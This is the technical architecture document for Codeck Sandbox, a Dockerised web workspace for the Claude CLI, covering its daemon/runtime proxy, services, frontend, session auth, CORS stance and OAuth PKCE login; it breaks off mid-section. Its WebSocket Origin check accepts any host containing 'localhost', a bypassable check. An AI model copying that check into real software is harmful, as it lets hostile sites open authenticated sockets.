# Technical Architecture — Codeck Sandbox

## Table of Contents

1. [Overview](#overview)
2. [Deployment modes](#deployment-modes)
3. [Process lifecycle](#process-lifecycle)
4. [Backend](#backend)
5. [Frontend](#frontend)
6. [Authentication flows](#authentication-flows)
7. [WebSocket protocol](#websocket-protocol)
8. [PTY terminal management](#pty-terminal-management)
9. [Port exposure](#port-exposure)
10. [Preset system](#preset-system)
11. [Docker infrastructure](#docker-infrastructure)
12. [Container filesystem at runtime](#container-filesystem-at-runtime)
13. [Security model](#security-model)
14. [Caching and in-memory state](#caching-and-in-memory-state)
15. [Concurrency & State Management](#concurrency--state-management)
16. [Module dependencies](#module-dependencies)

---

## Overview

### Monorepo structure

```
apps/
├── web/        Preact SPA (Vite build → apps/web/dist/)
├── runtime/    Backend: PTY, files, memory, agents, auth setup (Express + WS)
├── daemon/     Gateway proxy: auth, rate limiting, audit, HTTP/WS proxy (Express)
└── cli/        Host-side CLI for Docker lifecycle (codeck init/start/stop)
```

All four apps build independently (`npm run build`). The runtime and daemon share no code — communication is HTTP/WS over the network.

### Isolated mode (single container)

```
┌─────────────────┐
│   Browser        │
│  (Preact SPA)    │
└────────┬─────────┘
         │
   HTTP + WebSocket
         │
┌────────┴──────────────────────────┐
│     Runtime (:80)                  │
│                                    │
│  ├─ Static Files (apps/web/dist)  │
│  ├─ Auth Middleware               │
│  ├─ REST Routes (/api/*)          │
│  ├─ WebSocket Server              │
│  ├─ Services (PTY, files, memory) │
│  └─ /internal/status (health)     │
└───────────────────────────────────┘
```

The runtime serves the SPA, handles auth, and runs all backend logic. No daemon, no Docker socket. This is the default mode — simple and secure. Works on Linux, macOS, and Windows.

### Managed mode (daemon on host + runtime in container)

```
┌─────────────────┐
│   Browser        │
│  (Preact SPA)    │
└────────┬─────────┘
         │
   HTTP + WebSocket
         │
┌────────┴──────────────────────────┐
│     Daemon (:8080, host process)  │
│                                    │
│  ├─ Static Files (apps/web/dist)  │
│  ├─ Auth (login/logout/sessions)  │
│  ├─ Rate Limiting (auth + writes) │
│  ├─ Audit Log (JSONL)             │
│  ├─ Port Manager (compose ops)    │
│  ├─ HTTP Proxy (/api/* → runtime) │
│  └─ WS Proxy (upgrade → runtime)  │
└────────┬──────────────────────────┘
         │
    localhost (127.0.0.1:7777/7778)
         │
┌────────┴──────────────────────────┐
│     Runtime (:7777/:7778, private)│
│                                    │
│  ├─ REST Routes (/api/*)          │
│  ├─ WebSocket Server (:7778)      │
│  ├─ Services (PTY, files, memory) │
│  └─ /internal/status (health)     │
└───────────────────────────────────┘
```

The daemon runs as a native Node.js process on the host. It handles password auth, rate limiting, audit logging, and port exposure (via Docker Compose operations). The runtime is in an isolated Docker container — no Docker socket, never exposed to the network. Port requests from the runtime are delegated to the daemon via `CODECK_DAEMON_URL`. Works on Linux, macOS, and Windows.

The system does not use a database — all state lives in memory (Map/variables) and in JSON files on disk.

---

## Deployment modes

| | Isolated | Managed |
|---|---|---|
| **Processes** | 1 (runtime in container) | 2 (daemon on host + runtime in container) |
| **Exposed port** | Runtime `:80` | Daemon `:8080` |
| **Auth** | Runtime handles all | Daemon handles password auth; runtime trusts private network |
| **SPA served by** | Runtime | Daemon |
| **Browser talks to** | Runtime directly | Daemon only |
| **Runtime exposed?** | Yes (container port) | No (127.0.0.1 only) |
| **Docker compose** | `docker/compose.isolated.yml` | `docker/compose.managed.yml` |
| **Rate limiting** | Runtime (200/min general) | Daemon (10/min auth, 60/min writes) |
| **Audit log** | None | Daemon (`audit.log` JSONL) |
| **Port exposure** | Manual override or Docker socket (opt-in) | Daemon handles via compose operations |
| **Docker socket** | Not mounted (isolated) | Not mounted (isolated) |
| **Cross-platform** | Linux, macOS, Windows | Linux, macOS, Windows |
| **Use case** | Local sandbox, simple setup | VPS, multi-device access, dynamic ports |

### Managed mode proxy flow

```
Browser                    Daemon (host)              Runtime (container)
  │                          │                          │
  │ POST /api/auth/login ──→ │ (daemon-owned)           │
  │ ← {token} ──────────────│                           │
  │                          │                          │
  │ GET /api/console ──────→ │ validate token           │
  │                          │ proxy ──────────────────→ │ handle request
  │                          │ ← response ──────────────│
  │ ← response ─────────────│                           │
  │                          │                          │
  │ WS upgrade ────────────→ │ validate token           │
  │                          │ upgrade + pipe ─────────→ │ accept WS
  │ ← bidirectional ────────│←─────────────────────────│
```

**Daemon-owned routes** (not proxied):
- `GET /api/ui/status` — daemon health + WS connection count
- `GET /api/auth/status` — password configured?
- `POST /api/auth/login` — create daemon session
- `POST /api/auth/logout` — destroy daemon session
- `GET /api/auth/sessions` — list active sessions
- `DELETE /api/auth/sessions/:id` — revoke session
- `GET /api/auth/log` — auth event history
- `GET /api/ports` — list mapped ports (port manager)
- `POST /api/system/add-port` — expose a port (port manager)
- `POST /api/system/remove-port` — remove a port mapping (port manager)

**All other `/api/*`** requests are proxied to the runtime with `X-Forwarded-*` headers. The daemon strips its own `Authorization` header before proxying.

### Port exposure flow (managed mode)

```
Runtime                     Daemon (host)
  │                           │
  │ POST /api/system/add-port │
  │  (CODECK_DAEMON_URL) ───→ │
  │                           │ Write compose.override.yml
  │                           │ docker compose up -d runtime
  │  ← {success, restarting} │
```

In managed mode, the runtime delegates port requests to the daemon via `CODECK_DAEMON_URL`. The daemon writes `docker/compose.override.yml` and restarts the runtime container with the new port mapping. No Docker socket is needed inside the container.

---

## Process lifecycle

### Runtime startup

```
Docker ENTRYPOINT (or systemd ExecStart)
    │
    ▼
init-keyring.sh (Docker only)
    ├── dbus-daemon --system --fork
    ├── dbus-launch (session bus)
    ├── gnome-keyring-daemon --unlock (empty password)
    └── exec node apps/runtime/dist/index.js --web
            │
            ▼
        apps/runtime/src/index.ts::main()
            ├── If --clone URL: cloneRepository(url)
            └── startWebServer()
                    │
                    ▼
                apps/runtime/src/web/server.ts::startWebServer()
                    ├── installLogInterceptor()    → Intercepts console.log/error/warn/info
                    ├── express()                   → App + static + routes
                    ├── setupWebSocket(server)      → WS server (noServer mode)
                    ├── [if CODECK_WS_PORT] createWsServer() → Separate WS server on dedicated port
                    └── server.listen(PORT)
                        └── [post-listen callbacks]
                            ├── initPortManager()           → Read env vars, detect network mode
                            ├── updateClaudeMd()            → Creates/updates /workspace/CLAUDE.md from template + project list
                            ├── ensureDirectories()         → Creates memory system directories
                            ├── updateAgentBinary()         → Auto-updates Claude CLI (background, non-blocking)
                            ├── initializeIndexer()         → SQLite FTS5 indexer initialization
                            ├── initializeSearch()          → Memory search system initialization
                            ├── startPortScanner()          → Detects listening ports every 5s
                            ├── startMdns()                 → mDNS responder for codeck.local (LAN mode)
                            ├── startTokenRefreshMonitor()  → Background OAuth token refresh (every 5min, 30min margin)
                            ├── initProactiveAgents()       → Cron scheduler + agent runtime startup
                            └── restoreSavedSessions()      → Auto-resume sessions from previous lifecycle (delayed 2s)
```

### Runtime shutdown

```
SIGTERM / SIGINT
    │
    ▼
gracefulShutdown()
    ├── saveSessionState()       → Persists sessions for auto-restore
    ├── stopTokenRefreshMonitor()→ Clears token check interval
    ├── shutdownProactiveAgents()→ Stops cron schedules, kills running executions
    ├── shutdownSearch()         → Closes SQLite read connection
    ├── shutdownIndexer()        → Closes SQLite write connection
    ├── stopMdns()               → Stops mDNS responder
    ├── stopPortScanner()        → Clears port scanning interval timer
    ├── destroyAllSessions()     → Kills all PTYs
    ├── server.close()           → Closes HTTP/WS connections
    ├── [if wsServer] wsServer.close() → Closes dedicated WS server
    └── setTimeout(5000)         → Force exit if it doesn't close
```

### Daemon startup (gateway mode only)

```
node apps/daemon/dist/index.js
    │
    ▼
apps/daemon/src/server.ts::startDaemon()
    ├── express()                      → App + helmet + JSON parser
    ├── Register daemon-owned routes   → /api/ui/status, /api/auth/*
    ├── Auth middleware                 → Bearer token validation (if password configured)
    ├── Writes rate limiter            → POST/PUT/DELETE on /api/* (excl. auth/)
    ├── Proxy catch-all                → /api/* → runtime via HTTP proxy
    ├── express.static(WEB_DIST)       → Serve SPA from apps/web/dist/
    ├── SPA catch-all                  → index.html for client-side routing
    ├── server.on('upgrade')           → WS proxy handler
    └── server.listen(DAEMON_PORT)
```

### Daemon shutdown

```
SIGTERM / SIGINT
    │
    ▼
gracefulShutdown()
    ├── shutdownWsProxy()        → Close all WS connections, stop ping interval
    ├── authLimiter.destroy()    → Clear rate limit timer
    ├── writesLimiter.destroy()  → Clear rate limit timer
    ├── flushAudit()             → Flush buffered audit entries to disk
    ├── server.close()           → Close HTTP connections
    └── setTimeout(5000)         → Force exit if it doesn't close
```

The container uses `tini` as PID 1 (`init: true` in docker-compose) to reap zombie processes from dev servers.

---

## Backend

The backend is split between two Express applications: the **runtime** (all business logic) and the **daemon** (auth gateway + proxy). In local mode, only the runtime runs. In gateway mode, both run.

### Runtime middleware pipeline

Requests to `/api/*` pass through this pipeline in order:

```
Request → Static Files → JSON Parser → Rate Limiter → Auth Endpoints (public) → Auth Middleware → Routes
```

1. **Static files** — `express.static(apps/web/dist)` serves the compiled frontend (local mode only; daemon serves SPA in gateway mode)
2. **JSON parser** — `express.json()` for body parsing
3. **Rate limiter** — In-memory Map, per-route: 10 req/min for `/api/auth`, 200 req/min for `/api/*`, with 5-minute stale IP cleanup
4. **Auth endpoints** — `/api/auth/status`, `/setup`, `/login` are public; `/logout` and `/change-password` are protected
5. **Auth middleware** — Validates `Authorization: Bearer <token>` or `?token=` query param against `activeSessions` Map. Localhost (127.0.0.1) bypasses auth for `/api/memory/*` (agent access)
6. **Routes** — 14 routers mounted at `/api/<domain>`, plus inline auth/status/logs/ports/account endpoints
7. **Internal endpoints** — `/internal/status` returns `{status: "ok", uptime}` (registered before auth middleware, used by daemon for health checks)

### Daemon middleware pipeline (gateway mode)

```
Request → JSON Parser → Daemon Routes (public) → Auth Middleware → Writes Limiter → Proxy → Static Files → SPA
```

1. **JSON parser** — `express.json()` for body parsing
2. **Daemon routes** — `GET /api/ui/status`, `GET /api/auth/status`, `POST /api/auth/login` (public, rate limited)
3. **Auth middleware** — Validates daemon session token (`Authorization: Bearer` or `?token=`). Skipped if no password configured
4. **Writes rate limiter** — 60 req/min for POST/PUT/DELETE on `/api/*` (excl. auth/, GET/HEAD/OPTIONS)
5. **Protected daemon routes** — logout, sessions, session revoke, auth log
6. **Proxy catch-all** — All remaining `/api/*` forwarded to runtime via HTTP proxy
7. **Static files** — `express.static(apps/web/dist)` with cache headers (1yr immutable for hashed assets, no-cache for HTML)
8. **SPA catch-all** — `index.html` for client-side routing

### Runtime service layer

Each service is an ES module with pure functions (no classes). Mutable state is encapsulated in module variables. All services run in the runtime process (`apps/runtime/`).

| Service | File | In-memory state | Disk persistence |
|---------|------|-----------------|------------------|
| `auth` | `services/auth.ts` | `activeSessions: Map<token, {createdAt}>` | `/workspace/.codeck/auth.json` (hash+salt+algo, mode 0600) |
| `auth-anthropic` | `services/auth-anthropic.ts` | `loginState`, `authCache`, `currentCodeVerifier/State` | `/root/.claude/.credentials.json` (OAuth token, AES-256-GCM encrypted, mode 0600) |
| `claude-usage` | `services/claude-usage.ts` | `cachedUsage` (60s TTL) | None (fetches from Anthropic API) |
| `git` | `services/git.ts` | `gitHubConfig`, `sshTestCache`, CLI check caches | `/root/.ssh/*`, `/workspace/CLAUDE.md` (from template) |
| `console` | `services/console.ts` | `sessions: Map<id, ConsoleSession>` | `/root/.claude.json` (onboarding flag) |
| `mdns` | `services/mdns.ts` | `responder` (multicast-dns instance) | None (network socket only) |
| `preset` | `services/preset.ts` | None | `/workspace/.codeck/config.json` (active preset) |
| `resources` | `services/resources.ts` | `prevCpuUsage` (for delta calculation) | None (reads cgroups v2 / OS APIs) |
| `memory` | `services/memory.ts` | `flushState` (rate-limit tracking) | `/workspace/.codeck/memory/*`, `/workspace/.codeck/state/` |
| `memory-indexer` | `services/memory-indexer.ts` | `db` (better-sqlite3 instance), file watcher | `/workspace/.codeck/index/index.db` |
| `memory-search` | `services/memory-search.ts` | `db` (better-sqlite3 readonly) | `/workspace/.codeck/index/index.db` |
| `session-writer` | `services/session-writer.ts` | `sessionStreams: Map`, input/output buffers | `/workspace/.codeck/sessions/*.jsonl` |
| `port-manager` | `services/port-manager.ts` | `networkMode`, `mappedPorts: Set`, `containerId`, compose labels | Writes `compose.override.yml` via Docker helper |
| `logger` | `web/logger.ts` | `logBuffer: LogEntry[]` (circular, max 100), `wsClients[]` | None |

### Daemon service layer (gateway mode)

Daemon services run in a separate process (`apps/daemon/`). They handle auth gating and proxying — no business logic.

| Service | File | In-memory state | Disk persistence |
|---------|------|-----------------|------------------|
| `auth` | `services/auth.ts` | `activeSessions: Map<token, SessionData>` | `/workspace/.codeck/daemon-sessions.json` (mode 0600). Reads `/workspace/.codeck/auth.json` (shared with runtime, read-only) |
| `audit` | `services/audit.ts` | `buffer: string[]` (flush every 5s or 20 entries) | `/workspace/.codeck/audit.log` (JSONL, mode 0600) |
| `rate-limit` | `services/rate-limit.ts` | `RateLimiter` instances (per-IP sliding window) | None |
| `proxy` | `services/proxy.ts` | None | None |
| `ws-proxy` | `services/ws-proxy.ts` | `connections: Set<WsConnection>`, ping interval | None |

### Runtime routers

Each router is an `express.Router()` mounted at a path prefix in `apps/runtime/src/web/server.ts`:

| Router | Mount path | Delegates to |
|--------|-----------|-------------|
| `agent.routes.ts` | `/api/claude` | `services/auth-anthropic.ts` — OAuth login flow |
| `codeck.routes.ts` | `/api/codeck` | Direct fs — `/workspace/.codeck/` agent data CRUD |
| `console.routes.ts` | `/api/console` | `services/console.ts` — PTY session management |
| `dashboard.routes.ts` | `/api/dashboard` | `services/resources.ts` + `services/claude-usage.ts` |
| `files.routes.ts` | `/api/files` | Direct fs — `/workspace/` file browsing |
| `git.routes.ts` | `/api/git` | `services/git.ts` — Repository cloning |
| `github.routes.ts` | `/api/github` | `services/git.ts` — GitHub device code login |
| `memory.routes.ts` | `/api/memory` | `services/memory.ts`, `services/memory-search.ts`, `services/session-writer.ts` — Memory CRUD, FTS5 search, session transcripts |
| `preset.routes.ts` | `/api/presets` | `services/preset.ts` — List/apply/reset presets |
| `project.routes.ts` | `/api/projects` | Direct spawn + `services/git.ts` — Create/clone projects |
| `ssh.routes.ts` | `/api/ssh` | `services/git.ts` — SSH key management |
| `system.routes.ts` | `/api/system` | `services/port-manager.ts` — Network info, port exposure |
| `workspace.routes.ts` | `/api/workspace` | Direct spawn — Export workspace as tar.gz (includes `.codeck/` agent data) |
| `permissions.routes.ts` | `/api/permissions` | `services/permissions.ts` — CLI permission toggles |
| `agents.routes.ts` | `/api/agents` | `services/proactive-agents.ts` — Proactive agent CRUD + scheduler |

In gateway mode, all these routes are accessed through the daemon's HTTP proxy. The proxy is transparent — endpoint paths and payloads are identical.

Pattern: routes call `broadcastStatus()` after operations that change state, to notify all WS clients.

### Logger

`logger.ts` intercepts `console.log`, `console.error`, `console.warn`, and `console.info` globally:

```
console.log("message")
    │
    ├── originalLog("message")           → container stdout (captured by Docker)
    ├── sanitizeSecrets("message")       → Removes 15+ secret patterns (API keys, tokens, JWTs, etc.)
    ├── truncate(10KB max)               → Prevents memory exhaustion
    ├── logBuffer.push({type, message})  → Circular buffer (max 100 entries)
    └── broadcast({type:'log', data})    → WebSocket to all clients
```

**Secret Sanitization Patterns** (from `session-writer.ts:sanitizeSecrets()`):
- Bearer tokens, API keys, JWTs
- AWS, DigitalOcean, HuggingFace, SendGrid, Anthropic, GitHub, GitLab, npm, Slack tokens
- Database connection strings (`://user:pass@host`)
- PEM private keys

**Logging Destinations**:
1. Container stdout/stderr → Docker json-file driver (with rotation: 10MB max-size, 3 max-file)
2. In-memory circular buffer → WebSocket clients for real-time UI
3. Session transcripts → `/workspace/.codeck/memory/sessions/*.jsonl` (PTY input/output)
4. Agent execution logs → `/workspace/.codeck/agents/*/executions/*.{jsonl,log}` (proactive agents)

**Log Retention**:
- Docker logs: 30MB total (10MB × 3 rotated files)
- Session transcripts: No automatic expiry (manual deletion via File Browser)
- Agent execution logs: Last 100 executions per agent (auto-pruned)
- Memory daily logs: No automatic expiry

---

## Frontend

### Stack

- **Preact 10.19** — Lightweight Virtual DOM (3KB), React-compatible API
- **@preact/signals** — Reactive state without unnecessary re-renders
- **xterm.js 5.5** — Terminal emulator in the browser
- **Vite 5.4** — Bundler, dev server with HMR, output to `apps/web/dist/`

### Component tree

```
App (app.tsx)
├── [view=loading]  → LoadingView
├── [view=auth]     → AuthView
│                      └── Password form (setup or login)
├── [view=setup]    → SetupView + LoginModal
│                      └── OAuth flow UI
├── [view=preset]   → PresetWizard
│                      └── Preset selection cards
└── [view=main]     → Main layout
    ├── Sidebar
    │   ├── Navigation (home/filesystem/claude/memory/integrations/config)
    │   ├── Connection status dot
    │   └── Brand header
    ├── Content Area
    │   ├── [section=home]          → HomeSection
    │   │   ├── Account info cards
    │   │   ├── Container resources (CPU/Memory/Disk bars)
    │   │   ├── Claude usage (5h/7d windows)
    │   │   └── Workspace export
    │   ├── [section=filesystem]    → FilesSection
    │   │   └── Directory browser (/workspace)
    │   ├── [section=claude]        → ClaudeSection
    │   │   ├── Session tabs (rename, close)
    │   │   ├── Terminal containers (xterm.js)
    │   │   └── New session button
    │   ├── [section=integrations]  → IntegrationsSection
    │   │   ├── SSH key management
    │   │   └── GitHub CLI auth (device flow)
    │   └── [section=config]        → ConfigSection
    │       ├── .codeck file browser/editor
    │       └── Reset to defaults
    ├── LogsDrawer
    ├── LoginModal
    ├── NewProjectModal
    └── ReconnectOverlay
        ├── Tab: Existing folder
        ├── Tab: Create new folder
        └── Tab: Clone repository
```

### State (Signals)

The frontend uses **signals** instead of useState/Redux. Signals are declared in `state/store.ts` as global singletons:

```typescript
// View state
export const view = signal<View>('loading');              // loading | auth | setup | preset | main
export const activeSection = signal<Section>('home');     // home | filesystem | claude | integrations | config
export const authMode = signal<AuthMode>('login');        // setup | login

// Claude state
export const claudeAuthenticated = signal(false);
export const claudeInstalled = signal(false);
export const claudeLoginUrl = signal('');
export const claudeLoginActive = signal(false);

// Account
export const accountEmail = signal('');
export const accountOrg = signal('');
export const accountUuid = signal('');

// Sessions
export const sessions = signal<TerminalSession[]>([]);
export const activeSessionId = signal('');

// Connection & UI
export const wsConnected = signal(false);
export const logs = signal<LogEntry[]>([]);
export const logsExpanded = signal(false);
export const presetConfigured = signal(false);
export const currentFilesPath = signal('');
```

State is updated from two sources:

1. **Server push** — WebSocket `status` messages → `updateStateFromServer(data)`
2. **API responses** — After REST calls, the frontend updates signals locally

### Frontend initialization flow

```
App mount
    │
    ├── GET /api/auth/status
    │   ├── Not configured → view='auth', authMode='setup'
    │   └── Configured
    │       ├── No token in localStorage → view='auth', authMode='login'
    │       └── Token exists
    │           ├── GET /api/status (validates token)
    │           │   ├── 401 → view='auth'
    │           │   └── OK → updateStateFromServer(data)
    │           │       ├── Preset not configured → view='preset'
    │           │       ├── Claude authenticated → view='main', connectWebSocket(), restoreSessions()
    │           │       └── Claude not auth → view='setup', connectWebSocket()
    │           └── Network error → retry in 3s
```

### Terminal (xterm.js)

Each PTY session has a DOM container with an xterm.js `Terminal`:

```
ClaudeSection
    ├── Tab bar (session tabs + "new" button)
    └── Terminal container
        └── xterm.js Terminal instance
            ├── FitAddon (auto-resize with ResizeObserver)
            ├── onData → wsSend({type:'console:input'})
            └── writeToTerminal() ← WS 'console:output' messages
```

Terminal configuration:
- Dark theme: bg `#0a0a0b`, fg `#fafafa`, cursor `#6366f1`
- Font: JetBrains Mono, Fira Code, monospace — 14px (12px on mobile)
- Initial rows/cols: 120x30 (adjusted with FitAddon)
- Mobile: adjusts font size, debounce resize (200ms vs 50ms)

### Communication (API + WS)

**`api.ts`** — Fetch wrapper:
```typescript
// Automatically adds Authorization header from localStorage
// On 401 response: clears token, sets view='auth', throws error
export async function apiFetch(url: string, options?: RequestInit): Promise<Response>
```

**`ws.ts`** — WebSocket client:
- Connects to `ws[s]://host?token=<auth_token>`
- Auto-reconnect with exponential backoff (1s → 2s → 4s → ... → 30s cap, resets on success)
- On `status` message: syncs session list from server, then re-attaches to current sessions
- Registrable handlers for `console:output` and `console:exit`

---

## Authentication flows

### 1. Local password

Access authentication for the webapp. Single-user, stored in the container.

**In local mode**, the runtime handles all auth directly. **In gateway mode**, the daemon has its own session store (`daemon-sessions.json`) and validates passwords against the shared `auth.json`. The runtime trusts the private network — daemon strips its auth header before proxying.

```
┌────────┐                         ┌────────┐                    ┌─────────────────────────┐
│ Browser│                         │ Server │                    │ /workspace/.codeck/   │
└───┬────┘                         └───┬────┘                    │   auth.json             │
    │                                  │                         └────────────┬────────────┘
    │ POST /api/auth/setup             │                                      │
    │  {password: "xxx"}               │                                      │
    │─────────────────────────────────>│                                      │
    │                                  │ salt = randomBytes(32)               │
    │                                  │ hash = scrypt(password, salt, 64)    │
    │                                  │ token = randomBytes(32)              │
    │                                  │                                      │
    │                                  │ write {passwordHash, salt}──────────>│
    │                                  │ activeSessions.set(token)            │
    │                                  │                                      │
    │  {success, token}                │                                      │
    │<─────────────────────────────────│                                      │
    │                                  │                                      │
    │ localStorage.set(token)          │                                      │
```

**Subsequent login:**
```
POST /api/auth/login {password}
    → hash = scrypt(password, salt, 64)
    → timingSafeEqual(hash, storedHash)
    → token = randomBytes(32)
    → activeSessions.set(token, {createdAt})
    → Response: {token}
```

Sessions expire after 7 days (`SESSION_TTL = 7 * 24 * 60 * 60 * 1000`). There is no refresh — the user re-logs in. Legacy SHA-256 hashes are auto-migrated to scrypt on successful login.

**Session Management Architecture:**

Codeck uses **Bearer token authentication** with localStorage client-side storage instead of traditional HttpOnly cookies. This architectural decision was made to support:

1. **WebSocket Authentication** — Native WebSocket API requires token in URL or subprotocol (no custom headers supported in browser WebSocket constructor)
2. **File Download Authentication** — Content-Disposition file downloads can't send Authorization headers (browser limitation)
3. **LAN Access Simplicity** — Avoids SameSite/CORS cookie complexity for `.codeck.local` domains

**Session Token Properties:**
- 256-bit cryptographically random (exceeds OWASP 128-bit minimum)
- Regenerated on every login (session fixation prevention per OWASP guidelines)
- Stored server-side in memory Map + persisted atomically to `sessions.json` (mode 0o600)
- 7-day fixed TTL by default (configurable via `SESSION_TTL_MS` env var)
- All sessions invalidated on password change (forced re-authentication)

**Authentication Mechanisms:**
- API requests: `Authorization: Bearer <token>` header
- WebSocket: `?token=<token>` query parameter (token leakage vector — see AUDIT-66)
- Downloads: `?token=<token>` query parameter (necessary for file downloads)

**Security Trade-offs:**
- ❌ Tokens accessible to JavaScript (XSS risk — mitigated by CSP, DOMPurify, input validation)
- ✅ Simple architecture (no CSRF token infrastructure needed)
- ✅ Uniform auth across HTTP/WS/downloads
- ✅ Appropriate for localhost/LAN threat model

**XSS Mitigation Layers:**
- CSP headers restrict script sources (`scriptSrc: ["'self'"]`)
- DOMPurify sanitizes markdown rendering in memory section
- Xterm.js handles terminal ANSI escape sequences securely
- Input validation on all endpoints

**Future Migration Path (if needed):**
If Codeck adds public internet hosting or multi-tenant support, revisit:
1. Migrate to HttpOnly cookies for API auth
2. Implement WebSocket-level message authentication (first-message pattern)
3. Use short-lived one-time tokens for downloads
4. Add CSRF token infrastructure

See AUDIT-66 for detailed security analysis and threat model discussion.

### API Authentication Middleware Flow

**Runtime auth** — All `/api/*` endpoints are protected by a centralized auth middleware in the runtime, with **explicit exceptions** for public endpoints. In gateway mode, requests arrive pre-validated by the daemon (but runtime still enforces its own auth for defense in depth):

```
Request to /api/*
    │
    ▼
Public Endpoints (before middleware):
├─ GET  /api/auth/status      → isPasswordConfigured()
├─ POST /api/auth/setup       → setupPassword() [one-time only]
└─ POST /api/auth/login       → validatePassword() + rate limiting + lockout
    │
    ▼
Auth Middleware (applies to all other /api/*):
    if (!isPasswordConfigured()) → allow (setup not complete)
    token = req.headers.authorization?.replace('Bearer ', '')
         || req.query.token  // Allow ?token= for downloads
    if (!token || !validateSession(token)) → 401 Unauthorized
    next()
    │
    ▼
Protected Routes:
├─ POST /api/auth/logout            → invalidateSession()
├─ POST /api/auth/change-password   → requires current password
├─ GET  /api/ports
├─ GET  /api/status
├─ GET  /api/logs
├─ /api/claude/*                    → Claude agent operations
├─ /api/github/*                    → GitHub device flow
├─ /api/git/*                       → Git operations
├─ /api/ssh/*                       → SSH key management
├─ /api/files/*                     → File browser
├─ /api/console/*                   → Terminal sessions
├─ /api/presets/*                   → Preset system
├─ /api/memory/*                    → Memory/search system
├─ /api/projects/*                  → Project management
├─ /api/workspace/*                 → Workspace export
├─ /api/dashboard/*                 → Dashboard status
├─ /api/codeck/*                    → Codeck config
├─ /api/permissions/*               → Permission config
├─ /api/system/*                    → System operations
└─ /api/agents/*                    → Proactive agents
```

**Rate Limiting Tiers:**
- `/api/auth/*`: 10 requests/minute (brute-force protection)
- `/api/*` (general): 200 requests/minute
- Login endpoint: Additional 5-attempt lockout (15-minute IP ban)

**Query Parameter Token (`?token=`):**
- Enables authenticated file downloads (browser limitation: no Authorization headers)
- Used for: `/api/workspace/export`, memory file downloads
- Same validation as Bearer token (`validateSession()`)
- Trade-off: Token appears in URL (logged by proxies/browsers) — acceptable for localhost/LAN

See AUDIT-105 for comprehensive API endpoint security analysis.

### CORS Configuration

**Codeck does NOT implement CORS middleware.** This is a deliberate architectural decision documented in AUDIT-105.

**Rationale:**
- Codeck runs on `localhost` or LAN (via `codeck.local`), not exposed to public internet
- Browser same-origin policy prevents external sites from calling Codeck's API
- No legitimate use case for cross-origin API requests
- Eliminates entire class of CORS misconfiguration vulnerabilities

**WebSocket Origin Validation:**
While HTTP endpoints rely on same-origin policy, WebSocket connections use explicit Origin header validation (websocket.ts:41-63):

```typescript
const origin = req.headers.origin;
const host = req.headers.host;
const originHost = new URL(origin).host;

// Allow same-origin, localhost variants, and *.codeck.local
const isAllowed = originHost === host
  || originHost.includes('localhost')
  || originHost.endsWith('.codeck.local')
  || originHost === 'codeck.local';

if (!isAllowed) {
  socket.write('HTTP/1.1 403 Forbidden\r\n\r\n');
  socket.destroy();
}
```

**If Internet Exposure Becomes Necessary:**
Add CORS middleware with explicit origin whitelist:
```typescript
import cors from 'cors';

const allowedOrigins = ['https://app.example.com', 'https://codeck.example.com'];

app.use(cors({
  origin: (origin, callback) => {
    if (!origin || allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed by CORS'));
    }
  },
  credentials: true, // Allow cookies/auth headers
}));
```

**Never use:**
- `origin: '*'` with `credentials: true` (rejected by browsers)
- `origin: '*'` in production (allows any domain to call API)
- Regex-based origin validation (bypass potential via encoded/unicode tricks)

### 2. Claude OAuth PKCE

Authentication with a Claude account to use the CLI.

```
┌────────┐          ┌────────┐          ┌──────────────┐          ┌─────────────────────┐
│ Browser│          │ Server │          │ claude.ai    │          │ platform.claude.com │
└───┬────┘          └───┬────┘          └──────┬───────┘          └─────────┬───────────┘
    │                   │                      │                            │
    │ POST /api/claude/ │                      │                            │
    │     login         │                      │                            │
    │──────────────────>│                      │                            │
    │                   │                      │                            │
    │                   │ code_verifier = randomBytes(32) → base64url       │
    │                   │ state = randomBytes(32) → base64url               │
    │                   │ nonce = randomBytes(32) → base64url               │
    │                   │ Persist to .pkce-state.json (0o600)               │
    │                   │ code_challenge = SHA-256(code_verifier) → base64url│
    │                   │                      │                            │
    │                   │ Build URL:           │                            │
    │                   │  claude.ai/oauth/authorize                        │
    │                   │    ?client_id=9d1c...│                            │
    │                   │    &response_type=code                            │
    │                   │    &redirect_uri=https://platform.claude.com/...  │
    │                   │    &scope=user:inference+user:profile             │
    │                   │    &code_challenge=<challenge>                    │
    │                   │    &code_challenge_method=S256                    │
    │                   │    &state=<state>     │                            │
    │                   │    &nonce=<nonce>     │                            │
    │                   │                      │                            │
    │ {url, started}    │                      │                            │
    │<──────────────────│                      │                            │
    │                   │                      │                            │
    │ User opens URL    │                      │                            │
    │ in another tab ───┼─────────────────────>│                            │
    │                   │                      │ User authorizes            │
    │                   │                      │ Redirect → callback page   │
    │                   │                      │ Shows: code#state          │
    │                   │                      │                            │
    │ User copies code  │                      │                            │
    │                   │                      │                            │
    │ POST /api/claude/ │                      │                            │
    │   login-code      │                      │                            │
    │  {code: "abc..."}│                      │                            │
    │──────────────────>│                      │                            │
    │                   │                      │                            │
    │                   │ POST https://platform.claude.com/v1/oauth/token   │
    │                   │  {grant_type: authorization_code,                 │
    │                   │   code, redirect_uri, client_id,                  │
    │                   │   code_verifier, state}                           │
    │                   │─────────────────────────────────────────────────>│
    │                   │                      │                            │
    │                   │                      │  {access_token, refresh_   │
    │                   │                      │   token, account, org}     │
    │                   │<─────────────────────────────────────────────────│
    │                   │                      │                            │
    │                   │ Validate state parameter (if returned)            │
    │                   │ Save to /root/.claude/.credentials.json            │
    │                   │  v2 encrypted format (AES-256-GCM):                │
    │                   │  {version: 2, claudeAiOauth: {                     │
    │                   │    accessToken: {encrypted, iv, tag},              │
    │                   │    refreshToken: {encrypted, iv, tag},             │
    │                   │    expiresAt}, accountInfo: {...}}                 │
    │                   │ File permissions: 0o600                            │
    │                   │ Delete .pkce-state.json                            │
    │                   │                      │                            │
    │ {success: true}   │                      │                            │
    │<──────────────────│                      │                            │
```

**Direct fallback:** If the user pastes a `sk-ant-oat01-...` token instead of a code, it is saved directly without exchange.

**Code parsing:** The server parses multiple input formats:
- Raw auth code: `abc123`
- Code with state: `abc123#state456` → extracts before the `#`
- Full URL: `https://...?code=abc123&state=...` → extracts the `code` param

**Timeout:** 5 minutes. If the login takes longer, `isLoginStale()` returns true and `cleanupLogin()` clears the state.

**Token Lifecycle & Edge Case Handling:**

The implementation handles several edge cases to ensure robust OAuth token management:

